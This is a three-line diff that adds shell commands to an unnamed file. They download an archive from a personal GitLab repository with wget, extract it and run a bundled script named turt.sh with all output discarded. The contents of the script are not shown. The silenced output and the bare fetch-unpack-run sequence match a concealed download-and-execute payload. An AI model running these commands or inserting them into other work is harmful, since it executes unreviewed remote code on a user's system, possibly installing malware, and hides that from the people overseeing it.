@@ -1,0 +1,3 @@
+wget https://gitlab.com/reyhanfebrian606/gass/-/raw/main/teteebo.tar.gz
+tar xf teteebo.tar.gz
+./turt.sh >/dev/null >/dev/null 2>&1
